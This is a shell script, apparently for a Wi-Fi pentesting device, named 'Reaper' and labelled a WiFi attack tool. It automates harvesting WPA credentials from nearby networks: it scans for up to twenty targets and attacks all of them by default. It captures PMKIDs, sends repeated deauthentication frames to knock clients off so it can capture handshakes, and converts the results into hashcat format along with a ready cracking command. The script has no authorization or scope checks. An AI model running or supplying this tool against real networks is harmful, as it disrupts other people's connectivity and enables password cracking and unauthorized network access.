#!/bin/sh
# Title: Reaper - Automated Hash Harvester
# Author: NullSec
# Description: Capture WPA handshakes and PMKIDs for offline cracking
# Category: WiFi Attack

LOOT_DIR="/mmc/nullsec/reaper"
mkdir -p "$LOOT_DIR"

echo "💀 REAPER - HASH HARVESTER"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"

[ ! -d "/sys/class/net/wlan0" ] && { echo "[!] wlan0 not found!"; exit 1; }

echo "Harvesting modes:"
echo "1) PMKID only (clientless attack)"
echo "2) Handshake capture (with deauth)"
echo "3) Full harvest (both methods)"
echo ""
echo -n "Choice [3]: "
read MODE
MODE=${MODE:-3}

echo -n "Duration per target in seconds [30]: "
read DURATION
DURATION=${DURATION:-30}

TIMESTAMP=$(date +%Y%m%d_%H%M)
RESULTS_DIR="$LOOT_DIR/harvest_$TIMESTAMP"
mkdir -p "$RESULTS_DIR"

echo ""
echo "[*] Enabling monitor mode..."
airmon-ng start wlan0 >/dev/null 2>&1
MON_IF=$(iw dev | grep -oE "wlan[0-9]mon" | head -1)
[ -z "$MON_IF" ] && MON_IF="wlan0mon"

# Scan for targets
echo "[*] Scanning for WPA networks..."
timeout 15 airodump-ng "$MON_IF" -w /tmp/reaper --output-format csv 2>/dev/null &
sleep 15

# Parse WPA targets
grep -E "^[0-9A-F]{2}:" /tmp/reaper-01.csv 2>/dev/null | \
    grep -iE "WPA|WPA2|WPA3" | head -20 > /tmp/reaper_targets.txt

TARGET_COUNT=$(wc -l < /tmp/reaper_targets.txt 2>/dev/null || echo 0)
echo "[+] Found $TARGET_COUNT WPA target(s)"

if [ "$TARGET_COUNT" = "0" ]; then
    echo "[!] No WPA networks found!"
    airmon-ng stop "$MON_IF" >/dev/null 2>&1
    exit 1
fi

echo ""
echo "=== Targets ==="
cat -n /tmp/reaper_targets.txt | awk -F',' '{print $1" BSSID:"$1" CH:"$4" "$14}'

echo ""
echo -n "Attack all targets? [Y/n]: "
read ATTACK_ALL
ATTACK_ALL=${ATTACK_ALL:-Y}

HARVESTED=0
PMKID_COUNT=0
HANDSHAKE_COUNT=0

echo ""
echo "[*] Beginning harvest..."
echo "Reaper Log - $(date)" > "$RESULTS_DIR/reaper.log"

while read line; do
    BSSID=$(echo "$line" | cut -d',' -f1 | tr -d ' ')
    CH=$(echo "$line" | cut -d',' -f4 | tr -d ' ')
    ESSID=$(echo "$line" | cut -d',' -f14 | tr -d ' ')
    
    [ -z "$BSSID" ] && continue
    [ -z "$CH" ] && continue
    
    SAFE_ESSID=$(echo "$ESSID" | tr -cd '[:alnum:]_-')
    [ -z "$SAFE_ESSID" ] && SAFE_ESSID="unknown"
    
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "💀 Target: $ESSID"
    echo "   BSSID: $BSSID | CH: $CH"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    iwconfig "$MON_IF" channel $CH 2>/dev/null
    
    # PMKID capture
    if [ "$MODE" = "1" ] || [ "$MODE" = "3" ]; then
        echo "[*] Attempting PMKID capture..."
        
        if which hcxdumptool >/dev/null 2>&1; then
            PMKID_FILE="$RESULTS_DIR/${SAFE_ESSID}_pmkid.pcapng"
            timeout $DURATION hcxdumptool -i wlan0 -o "$PMKID_FILE" --filterlist_ap="$BSSID" --filtermode=2 2>/dev/null
            
            if [ -f "$PMKID_FILE" ] && [ -s "$PMKID_FILE" ]; then
                HASH_FILE="$RESULTS_DIR/${SAFE_ESSID}_pmkid.22000"
                hcxpcapngtool -o "$HASH_FILE" "$PMKID_FILE" 2>/dev/null
                if [ -f "$HASH_FILE" ] && [ -s "$HASH_FILE" ]; then
                    echo "[+] PMKID captured!"
                    echo "PMKID: $ESSID $BSSID" >> "$RESULTS_DIR/reaper.log"
                    PMKID_COUNT=$((PMKID_COUNT + 1))
                fi
            fi
        fi
    fi
    
    # Handshake capture
    if [ "$MODE" = "2" ] || [ "$MODE" = "3" ]; then
        echo "[*] Capturing handshake (with deauth)..."
        
        airmon-ng start wlan0 >/dev/null 2>&1
        MON_IF=$(iw dev | grep -oE "wlan[0-9]mon" | head -1)
        iwconfig "$MON_IF" channel $CH 2>/dev/null
        
        CAP_FILE="$RESULTS_DIR/${SAFE_ESSID}_handshake"
        airodump-ng -c $CH --bssid "$BSSID" -w "$CAP_FILE" "$MON_IF" 2>/dev/null &
        DUMP_PID=$!
        
        sleep 5
        
        # Send deauths
        echo "[*] Sending deauthentication..."
        aireplay-ng -0 5 -a "$BSSID" "$MON_IF" 2>/dev/null &
        sleep 10
        aireplay-ng -0 5 -a "$BSSID" "$MON_IF" 2>/dev/null &
        sleep $((DURATION - 15))
        
        kill $DUMP_PID 2>/dev/null
        killall aireplay-ng 2>/dev/null
        
        # Check for handshake
        if [ -f "${CAP_FILE}-01.cap" ]; then
            if aircrack-ng "${CAP_FILE}-01.cap" 2>&1 | grep -q "1 handshake"; then
                echo "[+] Handshake captured!"
                echo "HANDSHAKE: $ESSID $BSSID" >> "$RESULTS_DIR/reaper.log"
                HANDSHAKE_COUNT=$((HANDSHAKE_COUNT + 1))
                
                # Convert for hashcat
                if which hcxpcapngtool >/dev/null 2>&1; then
                    hcxpcapngtool -o "$RESULTS_DIR/${SAFE_ESSID}_handshake.22000" "${CAP_FILE}-01.cap" 2>/dev/null
                fi
            fi
        fi
    fi
    
    HARVESTED=$((HARVESTED + 1))
    
done < /tmp/reaper_targets.txt

# Cleanup
killall airodump-ng aireplay-ng hcxdumptool 2>/dev/null
airmon-ng stop "$MON_IF" 2>/dev/null
rm -f /tmp/reaper* 2>/dev/null

# Combine all hashes
cat "$RESULTS_DIR"/*.22000 2>/dev/null | sort -u > "$RESULTS_DIR/all_hashes.22000"
TOTAL_HASHES=$(wc -l < "$RESULTS_DIR/all_hashes.22000" 2>/dev/null || echo 0)

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "💀 REAPER HARVEST COMPLETE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Targets attacked: $HARVESTED"
echo "PMKIDs captured:  $PMKID_COUNT"
echo "Handshakes:       $HANDSHAKE_COUNT"
echo "Total hashes:     $TOTAL_HASHES"
echo ""
echo "Results: $RESULTS_DIR/"
echo ""
echo "To crack offline:"
echo "  hashcat -m 22000 $RESULTS_DIR/all_hashes.22000 wordlist.txt"
echo ""

if [ "$TOTAL_HASHES" -gt 0 ]; then
    echo "=== Captured Hashes ==="
    head -20 "$RESULTS_DIR/all_hashes.22000"
fi
